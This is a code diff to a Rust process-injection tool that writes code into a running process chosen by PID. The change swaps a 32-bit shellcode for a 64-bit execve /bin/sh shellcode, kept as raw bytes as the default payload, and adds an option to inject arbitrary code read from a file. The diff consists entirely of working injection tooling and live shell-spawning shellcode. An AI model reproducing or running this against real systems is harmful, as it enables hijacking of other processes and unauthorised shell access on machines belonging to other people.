@@ -4,6 +4,8 @@ extern crate clap;
 mod injection;
 use std::process::exit;
 use caps::{Capability, CapSet};
+use std::io::Read;
+use std::fs::File;
 
 fn main() {
     let yaml = load_yaml!("options.yml");
@@ -30,15 +32,27 @@ fn main() {
         exit(1);
     }
 
-    let shellcode = b"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
-        .iter()
-        .map(|x| *x)
-        .collect::<Vec<u8>>();
-    let injector = injection::Injector::new(target_pid, shellcode).unwrap_or_else(|e| {
+    let code = match args.value_of("code") {
+            Some(path) => {
+                let mut v = Vec::new();
+                File::open(path).unwrap_or_else(|e| {
+                    eprintln!("{}: {}", path, e);
+                    exit(1);
+                }).read_to_end(&mut v).unwrap();
+                v
+            },
+            None => {
+                b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+                .iter()
+                .map(|x| *x)
+                .collect::<Vec<u8>>()
+            }
+    };
+    let injector = injection::Injector::new(target_pid, code).unwrap_or_else(|e| {
         eprintln!("{}", e);
         exit(1)
     });
-    if let Err(e) = injector.inject() {
+    if let Err(e) = injector.inject(args.is_present("verbose")) {
         eprintln!("{}", e);
     }
 }
